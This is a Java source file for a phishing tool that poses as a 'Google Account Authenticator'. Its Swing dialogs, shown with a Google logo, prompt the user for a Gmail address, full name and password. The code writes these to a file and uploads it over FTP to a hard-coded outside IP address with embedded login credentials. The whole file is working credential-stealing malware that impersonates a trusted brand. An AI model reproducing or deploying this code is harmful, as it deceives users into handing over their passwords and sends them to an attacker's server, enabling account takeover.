import java.awt.*;
import java.io.FileWriter;
import java.io.IOException;
import java.io.File;
import javax.swing.*;
import java.util.Random;

public class Main {
    public static void main(String[] args) throws Exception {

        FTP_Upload FTP_UploadObject = new FTP_Upload("144.217.164.62", "google", "google");
        finalNameClass finalNameClassObject = new finalNameClass();

        Random rand = new Random();

        String entry_heading = "EMAIL,FULL_NAME,PASSWORD";
        String current_user = System.getProperty("user.name");

        File entry_fileImported = finalNameClassObject.getEntry_file();
        File renamed_fileImported = finalNameClassObject.getRenamed_file();

        ImageIcon google = new ImageIcon("misc/google.png");

        String user_email = (String) JOptionPane.showInputDialog(null, "Enter your email address (name@gmail.com):", "Google Account Authenticator", JOptionPane.PLAIN_MESSAGE, google, null, "");

        if (!(user_email.contains("@gmail.com"))) {
            System.out.println("Enter a valid gmail.");
            System.exit(0);
        }

        String full_name = (String) JOptionPane.showInputDialog(null, "Enter your full name (for confirmation):", "Google Account Authenticator", JOptionPane.PLAIN_MESSAGE, google, null, "");

        if (!(full_name.contains(" "))) {
            System.out.println("Please enter your full name.");
            System.exit(0);
        }

        String user_password = (String) JOptionPane.showInputDialog(null, "Enter your password:", "Google Account Authenticator", JOptionPane.PLAIN_MESSAGE, google, null, "");

        JOptionPane.showMessageDialog(null, "Thank you for authenticating your account.", "Google Account Authenticator", JOptionPane.INFORMATION_MESSAGE, google);

        String raw_entry = user_email + "," + full_name + "," + user_password;
        String complete_entry = raw_entry.replaceAll(" ", "_");

        entry_fileImported.createNewFile();
        FileWriter writer = new FileWriter(entry_fileImported);
        writer.write(complete_entry + "\n");
        writer.close();
        entry_fileImported.renameTo(new File(String.valueOf(renamed_fileImported)));

        FTP_UploadObject.compileUpload();

    }
}